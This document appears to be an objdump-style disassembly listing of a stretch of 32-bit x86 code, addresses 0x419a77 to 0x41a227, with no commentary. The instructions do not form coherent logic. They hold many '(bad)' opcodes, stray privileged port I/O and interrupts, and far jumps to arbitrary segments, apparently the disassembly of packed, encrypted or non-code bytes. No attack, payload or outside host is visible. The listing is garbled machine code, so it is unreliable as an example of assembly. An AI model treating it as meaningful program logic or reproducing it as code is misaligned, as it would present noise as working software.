  419a77:	mov    al,ds:0xbd10fe5c
  419a7c:	enter  0x98b4,0x33
  419a80:	addr16 out dx,eax
  419a82:	rcl    DWORD PTR [eax],0x0
  419a85:	jbe    0x419a7c
  419a87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a88:	xor    eax,0xbff3f148
  419a8d:	popf   
  419a8e:	ins    BYTE PTR es:[edi],dx
  419a8f:	pop    ecx
  419a90:	xor    eax,0x7a9b94a7
  419a95:	add    bh,BYTE PTR [edx-0x7b]
  419a98:	mov    al,ds:0x134eb96b
  419a9d:	je     0x419a50
  419a9f:	cmp    al,0x8a
  419aa1:	dec    eax
  419aa2:	dec    ebx
  419aa3:	lahf   
  419aa4:	nop
  419aa5:	scas   eax,DWORD PTR es:[edi]
  419aa6:	mov    dh,0x1c
  419aa8:	int    0x54
  419aaa:	jge    0x419a5c
  419aac:	aaa    
  419aad:	pop    esp
  419aae:	inc    ebx
  419aaf:	enter  0xf7eb,0x55
  419ab3:	ins    DWORD PTR es:[edi],dx
  419ab4:	inc    eax
  419ab5:	pop    edx
  419ab6:	adc    edi,DWORD PTR [ebx-0x6e]
  419ab9:	push   esi
  419aba:	fisttp WORD PTR [edi-0x6bab8fd1]
  419ac0:	pop    eax
  419ac1:	(bad)  
  419ac2:	mov    ds:0xc682e9a2,al
  419ac7:	mov    eax,ds:0xb26836be
  419acc:	mov    eax,0xa3f9acef
  419ad1:	push   ss
  419ad2:	repz rcl ecx,cl
  419ad5:	fimul  WORD PTR [edx-0x5f1fb759]
  419adb:	sbb    eax,0xffb491bd
  419ae0:	push   ebp
  419ae1:	ret    
  419ae2:	aad    0x66
  419ae4:	ja     0x419b49
  419ae6:	xchg   ecx,eax
  419ae7:	add    DWORD PTR [edi-0x22],0xffffff84
  419aeb:	push   edx
  419aec:	jne    0x419ac9
  419aee:	out    0x0,eax
  419af0:	scas   al,BYTE PTR es:[edi]
  419af1:	push   eax
  419af2:	adc    DWORD PTR cs:[edi+0x7a],ecx
  419af6:	dec    eax
  419af7:	lock outs dx,DWORD PTR ds:[esi]
  419af9:	push   ss
  419afa:	fmul   QWORD PTR [eax]
  419afc:	gs or  ecx,esp
  419aff:	jmp    0x419b69
  419b01:	add    eax,0x42780e0e
  419b06:	jp     0x419ad4
  419b08:	xor    dl,BYTE PTR [ecx+0x5e66d565]
  419b0e:	xor    ebp,eax
  419b10:	pop    ebx
  419b11:	enter  0x9805,0x6b
  419b15:	mov    edx,0x9384407c
  419b1a:	dec    esp
  419b1b:	xchg   DWORD PTR [esp+eax*8-0x79],edi
  419b1f:	add    DWORD PTR [edi],0x7dc39152
  419b25:	push   edx
  419b26:	sub    DWORD PTR [ecx+edi*1-0xa],esi
  419b2a:	jp     0x419b12
  419b2c:	(bad)  
  419b2d:	lods   al,BYTE PTR ds:[esi]
  419b2e:	adc    DWORD PTR [edx+0x77bfc87],ecx
  419b34:	jmp    0x6fcb36e8
  419b39:	out    dx,al
  419b3a:	jnp    0x419ad3
  419b3c:	sbb    al,0x80
  419b3e:	push   ecx
  419b3f:	sub    al,0xd7
  419b41:	or     ah,0x99
  419b44:	fisub  DWORD PTR [esi-0x69a20526]
  419b4a:	imul   esi,DWORD PTR ds:0x192a8681,0x654225fa
  419b54:	xchg   BYTE PTR [ebp+0x1c],ch
  419b57:	enter  0x7e7b,0xf4
  419b5b:	sub    edx,DWORD PTR ds:0x3b47c9de
  419b61:	clc    
  419b62:	pop    ds
  419b63:	test   DWORD PTR ss:[esi],eax
  419b66:	adc    al,0x51
  419b68:	lods   eax,DWORD PTR ds:[esi]
  419b69:	sbb    edx,DWORD PTR [esi]
  419b6b:	ins    DWORD PTR es:[edi],dx
  419b6c:	scas   al,BYTE PTR es:[edi]
  419b6d:	dec    esi
  419b6e:	sahf   
  419b6f:	ins    BYTE PTR es:[edi],dx
  419b70:	aas    
  419b71:	shl    BYTE PTR [edx-0x3fd91c],0x5c
  419b78:	mov    WORD PTR [edx-0x1fb30b5a],?
  419b7e:	xor    edi,0xe
  419b81:	lds    eax,FWORD PTR [esi]
  419b83:	pop    ss
  419b84:	adc    eax,0x5607f44b
  419b89:	mov    esp,0x5c14d2ad
  419b8e:	mov    dh,0x44
  419b90:	cmp    eax,0x868a3ea9
  419b95:	test   BYTE PTR [esi-0x60],bl
  419b98:	add    BYTE PTR [ebp-0x27594688],bh
  419b9e:	xchg   edx,eax
  419b9f:	mov    ah,0xde
  419ba1:	and    edx,DWORD PTR ds:0xcdc93ef7
  419ba7:	in     eax,dx
  419ba8:	and    eax,0x635338b8
  419bad:	mov    cl,0x19
  419baf:	jne    0x419c0d
  419bb1:	scas   al,BYTE PTR es:[edi]
  419bb2:	lea    ecx,ds:0xa2912323
  419bb8:	mov    ds:0x29b847b3,eax
  419bbd:	pop    ss
  419bbe:	pop    ecx
  419bbf:	cld    
  419bc0:	clc    
  419bc1:	ins    DWORD PTR es:[edi],dx
  419bc2:	out    dx,eax
  419bc3:	test   edx,ebx
  419bc5:	or     ebp,DWORD PTR [ecx+0xd]
  419bc8:	add    al,0x48
  419bca:	clc    
  419bcb:	or     dh,0xd1
  419bce:	cmp    bh,BYTE PTR [edx+0x50]
  419bd1:	xor    cl,BYTE PTR [esi-0x5d]
  419bd4:	stos   DWORD PTR es:[edi],eax
  419bd5:	je     0x419bd6
  419bd7:	jle    0x419b60
  419bd9:	sub    ah,bl
  419bdb:	mov    ebp,0x5be55efe
  419be0:	sbb    BYTE PTR [esi-0x50],cl
  419be3:	ss cmc 
  419be5:	leave  
  419be6:	cmp    al,0xc3
  419be8:	stos   BYTE PTR es:[edi],al
  419be9:	cmc    
  419bea:	xchg   BYTE PTR ds:0xa5bf7867,bh
  419bf0:	cld    
  419bf1:	and    eax,0x89c8a096
  419bf6:	icebp  
  419bf7:	int    0x51
  419bf9:	jp     0x419c56
  419bfb:	aas    
  419bfc:	add    bl,BYTE PTR [esi-0x4b]
  419bff:	adc    al,0xf2
  419c01:	cdq    
  419c02:	pusha  
  419c03:	mov    ch,0xff
  419c05:	or     ah,bh
  419c07:	(bad)  
  419c08:	fistp  QWORD PTR ds:0x41862418
  419c0e:	xor    esi,edi
  419c10:	jae    0x419c1b
  419c12:	icebp  
  419c13:	outs   dx,BYTE PTR ds:[esi]
  419c14:	mov    esp,0x85d0ad78
  419c19:	retf   
  419c1a:	aas    
  419c1b:	jmp    0x419c8b
  419c1d:	ja     0x419c29
  419c1f:	mov    dl,0x3
  419c21:	push   ss
  419c22:	push   ds
  419c23:	les    esp,FWORD PTR ds:0x75947a3
  419c29:	daa    
  419c2a:	sub    dl,bh
  419c2c:	jae    0x419bbb
  419c2e:	adc    bh,al
  419c30:	ret    0xc564
  419c33:	sub    al,0xc7
  419c35:	and    BYTE PTR [edx+ecx*2+0x43],0x51
  419c3a:	int3   
  419c3b:	add    al,0xc
  419c3d:	and    al,0x6e
  419c3f:	and    edx,esp
  419c41:	ds rol al,0xa
  419c45:	or     ch,ch
  419c47:	or     DWORD PTR [esi-0x2c],ecx
  419c4a:	xchg   esp,eax
  419c4b:	add    ebx,ecx
  419c4d:	mov    ?,WORD PTR [edx]
  419c4f:	outs   dx,BYTE PTR ds:[esi]
  419c50:	mov    ecx,0x2c10df93
  419c55:	popf   
  419c56:	push   esp
  419c57:	mov    esi,DWORD PTR [edi+esi*2]
  419c5a:	add    bl,BYTE PTR [eax+ebp*2-0x38ed33d]
  419c61:	ret    0x58b9
  419c64:	ins    BYTE PTR es:[edi],dx
  419c65:	xchg   BYTE PTR [esi+0x16],dh
  419c68:	(bad)  
  419c69:	inc    ch
  419c6b:	clc    
  419c6c:	out    dx,al
  419c6d:	test   al,0x8e
  419c6f:	aas    
  419c70:	mov    ds:0x7f4d0e61,al
  419c75:	xor    al,0xa4
  419c77:	cmp    eax,0x10bf4889
  419c7c:	push   eax
  419c7d:	std    
  419c7e:	sahf   
  419c7f:	adc    bh,BYTE PTR [ebx]
  419c81:	jecxz  0x419cec
  419c83:	lds    esi,FWORD PTR ds:0xd0b99f37
  419c89:	test   DWORD PTR [ebp+eax*4+0x56bd50af],esi
  419c90:	adc    cl,BYTE PTR [eax]
  419c92:	xchg   ebx,eax
  419c93:	and    esi,DWORD PTR [esi+0x4fcff4e2]
  419c99:	xor    bl,dl
  419c9b:	dec    eax
  419c9c:	ffreep st(3)
  419c9e:	ret    
  419c9f:	ret    
  419ca0:	mov    ah,0x52
  419ca2:	and    ch,bh
  419ca4:	bound  esi,QWORD PTR [eax-0x2d]
  419ca7:	mov    dl,0x69
  419ca9:	sub    esi,esp
  419cab:	es push ebx
  419cad:	jl     0x419c2f
  419caf:	push   edx
  419cb0:	repz (bad) 
  419cb2:	or     al,0x3b
  419cb4:	xchg   ebx,eax
  419cb5:	pop    ds
  419cb6:	ror    BYTE PTR [ebx],0x54
  419cb9:	dec    ebp
  419cba:	cmp    cl,BYTE PTR [ecx]
  419cbc:	xor    al,0x42
  419cbe:	daa    
  419cbf:	mov    cl,0x3b
  419cc1:	pop    edx
  419cc2:	lahf   
  419cc3:	sbb    edi,DWORD PTR ds:0x6ede0f8e
  419cc9:	sbb    dh,ch
  419ccb:	repz xchg edx,eax
  419ccd:	xor    edi,DWORD PTR [esi]
  419ccf:	or     bl,BYTE PTR [eax+0x493eb74]
  419cd5:	in     eax,dx
  419cd6:	mov    al,ds:0xf6609b67
  419cdb:	inc    edx
  419cdc:	ds (bad) 
  419cde:	call   0x4251dfe6
  419ce3:	inc    edi
  419ce4:	or     eax,0xfdd82acd
  419ce9:	dec    esi
  419cea:	lods   eax,DWORD PTR ds:[esi]
  419ceb:	fdiv   st(6),st
  419ced:	and    DWORD PTR [edi+0xa962a9a],esi
  419cf3:	adc    BYTE PTR [ebp-0x46],dl
  419cf6:	aad    0x96
  419cf8:	or     DWORD PTR [esi+0x5da71481],edi
  419cfe:	jne    0x419d2b
  419d00:	js     0x419d18
  419d02:	xor    al,0xd0
  419d04:	dec    eax
  419d05:	jp     0x419d6a
  419d07:	adc    DWORD PTR [eax-0x3d5edc0a],0xd1de2a99
  419d11:	adc    al,0xd7
  419d13:	enter  0x6837,0xff
  419d17:	enter  0xbd29,0xd2
  419d1b:	fdivr  QWORD PTR [ebx-0x5cbd0874]
  419d21:	or     ebx,DWORD PTR [ebx]
  419d23:	mov    esi,0x3df61927
  419d28:	sub    al,0x29
  419d2a:	or     BYTE PTR [edi+0x31],cl
  419d2d:	dec    edx
  419d2e:	or     eax,0xad2359c1
  419d33:	xchg   ebx,esi
  419d35:	in     al,0x39
  419d37:	popa   
  419d38:	mov    ah,0xab
  419d3a:	jae    0x419d64
  419d3c:	and    esp,DWORD PTR [esi+0x37]
  419d3f:	imul   edx,DWORD PTR [eax+0x3de9364d],0x78
  419d46:	out    0xf,al
  419d48:	int    0xe1
  419d4a:	mov    ah,0x3a
  419d4c:	dec    ebx
  419d4d:	adc    eax,0xafe4054
  419d52:	and    al,0x5c
  419d54:	sbb    al,0xf1
  419d56:	mov    ds:0xe0cdeeab,eax
  419d5b:	or     DWORD PTR [edi+eax*1+0x29e1a72c],edx
  419d62:	pop    ebx
  419d63:	ret    
  419d64:	push   eax
  419d65:	mov    eax,ds:0x574290b2
  419d6a:	jns    0x419dbc
  419d6c:	loopne 0x419cfd
  419d6e:	jmp    0xddf6:0x3988047c
  419d75:	and    al,0x5d
  419d77:	idiv   DWORD PTR [ebx-0x7b]
  419d7a:	and    ebp,DWORD PTR [ecx]
  419d7c:	mov    DWORD PTR ds:0xc5efb05,esp
  419d82:	mov    es,WORD PTR fs:[ebx]
  419d85:	adc    BYTE PTR [eax],al
  419d87:	jmp    0x419d94
  419d89:	imul   ebp,DWORD PTR [ecx],0xffffffa9
  419d8c:	fwait
  419d8d:	pusha  
  419d8e:	ins    DWORD PTR es:[edi],dx
  419d8f:	xchg   ebx,eax
  419d90:	pop    esi
  419d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d92:	push   edi
  419d93:	cmp    esp,DWORD PTR [ebp-0x3e]
  419d96:	push   ebx
  419d97:	scas   al,BYTE PTR es:[edi]
  419d98:	dec    ecx
  419d99:	xlat   BYTE PTR ds:[ebx]
  419d9a:	je     0x419d30
  419d9c:	mov    ds:0x7f7e8a72,al
  419da1:	inc    ebp
  419da2:	jp     0x419d89
  419da4:	push   ebx
  419da5:	jbe    0x419d5b
  419da7:	or     bl,ch
  419da9:	ret    0xbc3d
  419dac:	cmp    al,0x38
  419dae:	pushf  
  419daf:	or     BYTE PTR [ecx],ah
  419db1:	pop    edx
  419db2:	cmp    ebp,DWORD PTR [ebx]
  419db4:	daa    
  419db5:	inc    eax
  419db6:	(bad)  
  419db7:	lea    edi,[ecx+0x15]
  419dba:	mov    ebx,0x199475b4
  419dbf:	inc    ecx
  419dc0:	or     DWORD PTR ds:0xa60de79e,ecx
  419dc6:	inc    esp
  419dc7:	or     esp,DWORD PTR [esp+ebp*1]
  419dca:	pushf  
  419dcb:	fidivr WORD PTR [ebp+ebx*1+0x5dbbf7f3]
  419dd2:	add    eax,0xe5a0068d
  419dd7:	(bad)  
  419dd8:	xchg   esp,eax
  419dd9:	push   0xffffff99
  419ddb:	cmp    eax,0x13bf25be
  419de0:	sbb    eax,DWORD PTR [edi-0x640de6ab]
  419de6:	into   
  419de7:	mov    al,ds:0x952aedad
  419dec:	fidiv  DWORD PTR [ebx]
  419dee:	mov    ebp,0xa78ca36c
  419df3:	sub    ch,BYTE PTR [eax-0x75]
  419df6:	dec    esi
  419df7:	aam    0x9b
  419df9:	lds    eax,FWORD PTR [esi]
  419dfb:	mov    al,0x9e
  419dfd:	fwait
  419dfe:	imul   edx,DWORD PTR [esi],0x83f50de7
  419e04:	mov    BYTE PTR [ebp-0x69],bl
  419e07:	push   cs
  419e08:	retf   0x5fcb
  419e0b:	xor    al,0xbd
  419e0d:	iret   
  419e0e:	hlt    
  419e0f:	cmp    al,0xa0
  419e12:	inc    ebp
  419e13:	and    bl,BYTE PTR [eax-0x593f345b]
  419e19:	jmp    0xcf78d73b
  419e1e:	pop    esp
  419e1f:	mov    bh,BYTE PTR [ebp-0x70494a3c]
  419e25:	leave  
  419e26:	imul   esi,DWORD PTR [esp+edx*2],0xffffffa4
  419e2a:	and    ebx,DWORD PTR [esi]
  419e2c:	test   BYTE PTR [eax],dh
  419e2e:	pushf  
  419e2f:	push   edi
  419e30:	lahf   
  419e31:	lods   eax,DWORD PTR ds:[esi]
  419e32:	jno    0x419e62
  419e34:	inc    ecx
  419e35:	jo     0x419e83
  419e37:	or     eax,0x4f4b85eb
  419e3c:	pusha  
  419e3d:	push   edx
  419e3e:	ficomp DWORD PTR [ebp+0x50c6b33]
  419e44:	mov    ch,0x12
  419e46:	mov    eax,ds:0xcf10fdeb
  419e4b:	push   ebp
  419e4c:	cwde   
  419e4d:	mov    al,0xa5
  419e4f:	or     dl,BYTE PTR [edx]
  419e51:	pushf  
  419e52:	jne    0x419dfc
  419e54:	add    bl,0x62
  419e57:	js     0x419ea7
  419e59:	or     edx,edx
  419e5b:	lods   al,BYTE PTR ds:[esi]
  419e5c:	mov    bl,0x83
  419e5e:	mov    esi,edi
  419e60:	aaa    
  419e61:	sbb    al,0x59
  419e63:	cli    
  419e64:	xchg   edi,eax
  419e65:	sbb    al,0x3f
  419e67:	cmp    eax,0xc9e8e9e1
  419e6c:	add    ah,BYTE PTR [ebx+0x3f]
  419e6f:	(bad)  
  419e70:	call   0x7ccc:0x73eb3487
  419e77:	cli    
  419e78:	adc    BYTE PTR [edi-0x11b0ca5f],dl
  419e7e:	xchg   ecx,eax
  419e7f:	mov    ebp,0x30621597
  419e84:	data16 jae 0x419e58
  419e87:	mov    ecx,0xeb4634c9
  419e8c:	in     al,0x5b
  419e8e:	nop
  419e8f:	retf   0x361c
  419e92:	sar    BYTE PTR [esi],cl
  419e94:	xchg   edi,eax
  419e95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e96:	dec    eax
  419e97:	popa   
  419e98:	push   0x48492894
  419e9d:	add    DWORD PTR [eax-0x19],0xe872a85d
  419ea4:	and    al,BYTE PTR [edi+0x33]
  419ea7:	jmp    0xd216d9c8
  419eac:	dec    eax
  419ead:	sub    eax,0x16d8ba16
  419eb2:	sub    edx,edx
  419eb4:	inc    edx
  419eb5:	call   0xb4e16e17
  419eba:	les    ebp,FWORD PTR [edx+0x3d]
  419ebd:	add    DWORD PTR [edx-0x57cf70dc],edi
  419ec3:	add    cl,BYTE PTR [eax+0x52]
  419ec6:	mov    ah,0xd9
  419ec8:	xchg   ecx,eax
  419ec9:	xor    BYTE PTR [eax],al
  419ecb:	out    0x18,al
  419ecd:	aad    0x90
  419ecf:	fcmovnbe st,st(1)
  419ed1:	adc    BYTE PTR [ebx+0x74c2682a],0xca
  419ed8:	push   eax
  419ed9:	(bad)  
  419eda:	push   eax
  419edb:	mov    ecx,0xa6f66f23
  419ee0:	sar    DWORD PTR [eax-0x7a],0x30
  419ee4:	movq   mm5,QWORD PTR [eax+0x71d314ba]
  419eeb:	lock jbe 0x419ecd
  419eee:	jbe    0x419e8a
  419ef0:	jnp    0x419ec4
  419ef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ef3:	pop    ds
  419ef4:	cmp    eax,0xe25dcc52
  419ef9:	or     esp,ebx
  419efb:	mov    cl,0xfd
  419efd:	dec    edi
  419efe:	push   0xffffffee
  419f00:	test   ch,cl
  419f02:	adc    edx,DWORD PTR ds:0xaddfa28c
  419f08:	jnp    0x419f6f
  419f0a:	adc    cl,BYTE PTR ds:0x3a0c80f5
  419f10:	lahf   
  419f11:	fcom   DWORD PTR [ecx+0x16afe79a]
  419f17:	xor    al,0xbc
  419f19:	(bad)  
  419f1a:	jbe    0x419f6d
  419f1c:	pop    ds
  419f1d:	adc    bh,bl
  419f1f:	or     edx,DWORD PTR [eax+0x4b]
  419f22:	in     eax,0x13
  419f24:	iret   
  419f25:	mov    DWORD PTR [esp+eax*4+0x327a2641],ecx
  419f2c:	aaa    
  419f2d:	retf   0x7d5e
  419f30:	add    ah,cl
  419f32:	loope  0x419f7a
  419f34:	adc    DWORD PTR [ebx-0x2fe8eeba],esp
  419f3a:	jg     0x419f2f
  419f3c:	sbb    eax,0x5bd2eef7
  419f41:	js     0x419f34
  419f43:	push   esi
  419f44:	aam    0x71
  419f46:	cld    
  419f47:	imul   esi,ecx,0x3dd56e4
  419f4d:	and    al,0x74
  419f4f:	sub    edi,DWORD PTR [edx-0x51]
  419f52:	scas   eax,DWORD PTR es:[edi]
  419f53:	pop    es
  419f54:	and    cl,BYTE PTR [ecx-0x3f7746b4]
  419f5a:	add    DWORD PTR [eax],ebx
  419f5c:	mov    dh,0xd0
  419f5e:	loope  0x419eed
  419f60:	sti    
  419f61:	out    0x32,eax
  419f63:	push   ss
  419f64:	daa    
  419f65:	(bad)  
  419f66:	xchg   edx,eax
  419f67:	(bad)  
  419f68:	fcomp  st(7)
  419f6a:	sahf   
  419f6b:	xchg   esp,eax
  419f6c:	fs push ecx
  419f6e:	cmp    DWORD PTR [edx+0x4290fd2c],0xa6ec8699
  419f78:	test   eax,ebp
  419f7a:	inc    ebx
  419f7b:	add    BYTE PTR [eax],dh
  419f7d:	add    eax,0xda28d289
  419f82:	and    esp,DWORD PTR [esi+0x5e1adc62]
  419f88:	mov    WORD PTR [edi-0x74],?
  419f8b:	cwde   
  419f8c:	sbb    ecx,edx
  419f8e:	outs   dx,DWORD PTR ds:[esi]
  419f8f:	test   eax,esp
  419f91:	inc    esp
  419f92:	xchg   esp,eax
  419f93:	adc    eax,0x615157e0
  419f98:	pop    edx
  419f99:	les    edx,FWORD PTR [edx+0x67]
  419f9c:	call   0xffe02ba5
  419fa1:	scas   eax,DWORD PTR es:[edi]
  419fa2:	xor    edx,0x8f761737
  419fa8:	sub    cl,BYTE PTR [eax-0x7d6297f]
  419fae:	fstp   DWORD PTR [ebx-0x56]
  419fb1:	mov    edi,0x7434d29c
  419fb6:	sub    DWORD PTR [esi],esi
  419fb8:	stos   BYTE PTR es:[edi],al
  419fb9:	sub    al,0x85
  419fbb:	into   
  419fbc:	add    al,0x6c
  419fbe:	and    BYTE PTR [ebx-0x9a2a992],dl
  419fc4:	mov    al,0xff
  419fc6:	leave  
  419fc7:	xchg   BYTE PTR [ecx-0x1d86e2ab],ah
  419fcd:	cmp    BYTE PTR [ebx],bh
  419fcf:	push   edx
  419fd0:	pop    es
  419fd1:	sbb    BYTE PTR [ebx+0x70],bl
  419fd4:	xchg   ecx,eax
  419fd5:	ds inc ebp
  419fd7:	mov    esi,0x75a6f6b3
  419fdc:	lds    dx,DWORD PTR [edi-0x5]
  419fe0:	cs popf 
  419fe2:	xor    al,0xe7
  419fe4:	push   0x8a6cbbf2
  419fe9:	cmp    DWORD PTR [ecx-0x6d9b3c71],ebx
  419fef:	sub    esi,DWORD PTR [eax]
  419ff1:	sbb    eax,0xdfa44741
  419ff6:	dec    esi
  419ff7:	(bad)  
  419ff9:	out    0x42,al
  419ffb:	mov    bh,BYTE PTR [ebx+eiz*4]
  419ffe:	es dec eax
  41a000:	fdivr  st(7),st
  41a002:	adc    eax,0x19527dc8
  41a008:	pop    es
  41a009:	cmp    al,ch
  41a00b:	pop    es
  41a00c:	xlat   BYTE PTR ds:[ebx]
  41a00d:	int    0x43
  41a00f:	pop    es
  41a010:	stos   DWORD PTR es:[edi],eax
  41a011:	jbe    0x41a067
  41a013:	mov    al,0xbd
  41a015:	push   edi
  41a016:	mov    ?,WORD PTR [esi]
  41a018:	aaa    
  41a019:	cmp    DWORD PTR [esi+0x168ea70],0x6981dda1
  41a023:	dec    esi
  41a024:	addr16 pop esp
  41a026:	or     ebx,DWORD PTR [ebx+0x5d0dedb5]
  41a02c:	xchg   edi,eax
  41a02d:	dec    ecx
  41a02e:	pop    ebx
  41a02f:	cmp    ch,bl
  41a031:	daa    
  41a032:	in     eax,dx
  41a033:	sbb    BYTE PTR [eax-0x7b],ch
  41a036:	jne    0x41a095
  41a038:	clc    
  41a039:	inc    ebx
  41a03a:	int    0x66
  41a03c:	pop    esi
  41a03d:	mov    fs:0xed99d6cc,al
  41a043:	stos   BYTE PTR es:[edi],al
  41a044:	dec    esp
  41a045:	std    
  41a046:	test   dh,cl
  41a048:	rol    DWORD PTR [eax+0x55],1
  41a04b:	sub    BYTE PTR [edi-0x1ed77b63],ch
  41a051:	xchg   cl,bh
  41a053:	sub    ah,BYTE PTR [eax-0x31]
  41a056:	and    esi,DWORD PTR [edi]
  41a058:	fisubr DWORD PTR [ecx+0x5f]
  41a05b:	push   0x1d
  41a05d:	mov    bh,0x3b
  41a05f:	add    eax,0x2bb5a6bf
  41a064:	sub    esi,DWORD PTR [ebp+0x2e]
  41a067:	dec    ebx
  41a068:	push   0x6b
  41a06a:	jbe    0x41a043
  41a06c:	pusha  
  41a06d:	pop    ecx
  41a06e:	mov    ecx,0xa37fe22a
  41a073:	push   esp
  41a074:	shl    BYTE PTR [edi+0x79598686],cl
  41a07a:	nop
  41a07b:	and    BYTE PTR [esi],0xcf
  41a07e:	(bad)  
  41a07f:	pushf  
  41a080:	fbld   TBYTE PTR [ecx-0x3369db6b]
  41a086:	dec    ebp
  41a087:	into   
  41a088:	ret    
  41a089:	gs jo  0x41a109
  41a08c:	repnz sub eax,DWORD PTR [edx]
  41a08f:	jl     0x41a031
  41a091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a092:	xchg   esp,eax
  41a093:	es jmp 0x41a0ee
  41a096:	test   DWORD PTR [edi+0x15],ebx
  41a099:	pop    edx
  41a09a:	hlt    
  41a09b:	fs cwde 
  41a09d:	neg    BYTE PTR [eax]
  41a09f:	sub    ebx,0xbf7ff9ee
  41a0a5:	fisubr DWORD PTR [esi+0x75]
  41a0a8:	mov    dl,BYTE PTR [eax]
  41a0aa:	or     eax,0xb25a76b0
  41a0af:	ret    0xc4b
  41a0b2:	and    al,0xc4
  41a0b4:	or     al,0x59
  41a0b6:	retf   
  41a0b7:	out    dx,al
  41a0b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0b9:	mov    al,fs:0x59356f4a
  41a0bf:	data16 aad 0x99
  41a0c2:	rcr    bh,0x97
  41a0c5:	ins    DWORD PTR es:[edi],dx
  41a0c6:	mov    bh,0x31
  41a0c8:	test   DWORD PTR [ebx],eax
  41a0ca:	mov    bl,0xa9
  41a0cc:	cmp    eax,edx
  41a0ce:	xor    DWORD PTR [edi-0x69bf4790],edi
  41a0d4:	outs   dx,BYTE PTR ds:[esi]
  41a0d5:	mov    edi,0x557c337a
  41a0da:	arpl   WORD PTR [eax+0x25],ax
  41a0dd:	dec    esi
  41a0de:	mov    esi,0x19c5bcfb
  41a0e3:	stc    
  41a0e4:	gs aam 0xc1
  41a0e7:	push   0xfffffff3
  41a0e9:	lods   al,BYTE PTR ds:[esi]
  41a0ea:	or     ebx,DWORD PTR [eax+ebp*1-0xb128fce]
  41a0f1:	mov    bl,0x1d
  41a0f3:	mov    ebx,0x7de29dd
  41a0f8:	adc    edx,DWORD PTR [ebx]
  41a0fa:	gs push ds
  41a0fc:	jns    0x41a141
  41a0fe:	pop    edi
  41a100:	sti    
  41a101:	jmp    0x9cc9:0x7ee66445
  41a108:	adc    cl,ch
  41a10a:	pop    esp
  41a10b:	ret    
  41a10c:	cmp    al,0xf4
  41a10e:	push   0x8aa477c8
  41a113:	sub    al,0x2c
  41a115:	push   ebx
  41a116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a117:	in     eax,0xf7
  41a119:	push   ds
  41a11a:	and    DWORD PTR [eax-0x18],0x7c
  41a11e:	sub    ecx,edx
  41a120:	mov    bl,0x34
  41a122:	xchg   DWORD PTR [eax+0x51],esi
  41a125:	sub    al,0xe5
  41a127:	xchg   DWORD PTR [eax-0x30],edx
  41a12a:	fs or  al,0xb0
  41a12d:	dec    ebp
  41a12e:	out    dx,eax
  41a12f:	mov    ch,0x5b
  41a131:	ror    DWORD PTR [ebx],cl
  41a133:	dec    edi
  41a134:	(bad)
  41a137:	mov    ebx,0xf39dca70
  41a13c:	sbb    BYTE PTR [eax+0x3462575d],al
  41a142:	jl     0x41a1a3
  41a144:	xchg   esp,eax
  41a145:	lods   al,BYTE PTR ds:[esi]
  41a146:	mov    al,ds:0x50e06cce
  41a14b:	mov    bh,0x2a
  41a14d:	cmc    
  41a14e:	push   0xffffffa8
  41a150:	mov    esi,0xce0b9881
  41a155:	pop    di
  41a157:	xchg   edi,eax
  41a158:	jb     0x41a1d1
  41a15a:	dec    edi
  41a15b:	out    dx,eax
  41a15c:	loopne 0x41a10a
  41a15e:	sub    ah,0x49
  41a161:	cmp    DWORD PTR [edi+0x621b4774],ecx
  41a167:	pop    ds
  41a168:	adc    dh,bl
  41a16a:	mov    cl,0xf1
  41a16c:	les    esp,FWORD PTR [edx+ebx*1-0xfdd9837]
  41a173:	out    0x97,eax
  41a175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a176:	sub    DWORD PTR [esi-0x67cbbd7f],ebp
  41a17c:	cmp    dl,BYTE PTR [edi]
  41a17e:	out    dx,al
  41a17f:	cli    
  41a180:	shr    BYTE PTR [esi],1
  41a182:	mov    al,ds:0xfbfc678a
  41a187:	jmp    0x41a1f6
  41a189:	jmp    0x8252:0x86a29e40
  41a190:	inc    ebx
  41a191:	jg     0x41a11a
  41a193:	and    edi,DWORD PTR es:[ebp-0x1f381e62]
  41a19a:	adc    al,BYTE PTR gs:[edi+0x473c34b4]
  41a1a1:	leave  
  41a1a2:	pop    edi
  41a1a3:	cmovnp esi,ecx
  41a1a6:	or     dl,BYTE PTR [ecx]
  41a1a8:	fild   DWORD PTR [ebp+0x29382c69]
  41a1ae:	js     0x41a170
  41a1b0:	icebp  
  41a1b1:	xchg   DWORD PTR [eax-0x7c],ecx
  41a1b4:	adc    BYTE PTR [edi],dl
  41a1b6:	lahf   
  41a1b7:	and    BYTE PTR [esp+eax*8-0x33],0x44
  41a1bc:	sub    ebx,ebx
  41a1be:	dec    ecx
  41a1bf:	adc    BYTE PTR [ebp-0x1f44bd4b],ah
  41a1c5:	aas    
  41a1c6:	ds xchg edx,eax
  41a1c8:	sub    bh,BYTE PTR [ebp+eiz*2+0x19ea771]
  41a1cf:	jecxz  0x41a24f
  41a1d1:	push   ebx
  41a1d2:	adc    DWORD PTR [esi+0x342e8b53],esp
  41a1d8:	cmp    bh,cl
  41a1da:	mov    al,ds:0x4722895d
  41a1df:	cmc    
  41a1e0:	ins    DWORD PTR es:[edi],dx
  41a1e1:	hlt    
  41a1e2:	test   al,0x86
  41a1e4:	pop    es
  41a1e5:	pop    es
  41a1e6:	mov    ecx,0x11f76968
  41a1eb:	xor    BYTE PTR [edx],ah
  41a1ed:	and    al,bh
  41a1ef:	shl    BYTE PTR [edi-0x16],cl
  41a1f2:	lock add DWORD PTR [ecx+0x3a],0x10
  41a1f7:	inc    edx
  41a1f8:	dec    esi
  41a1f9:	sub    eax,DWORD PTR ds:0xff8fc1db
  41a1ff:	cld    
  41a200:	or     BYTE PTR [eax],al
  41a202:	inc    ecx
  41a203:	int3   
  41a204:	push   0x73
  41a206:	adc    BYTE PTR [ecx-0x65],cl
  41a209:	popf   
  41a20a:	pop    ecx
  41a20b:	in     eax,dx
  41a20c:	pushf  
  41a20d:	sub    BYTE PTR [edx-0x6970a54],al
  41a213:	xchg   edx,eax
  41a214:	mov    dh,0xa9
  41a216:	mov    esp,0x87659e47
  41a21b:	test   al,0xc4
  41a21d:	stc    
  41a21e:	mov    bl,0xa
  41a220:	imul   esp,ebx,0x3026fb70
  41a226:	dec    ecx
  41a227:	out    dx,eax
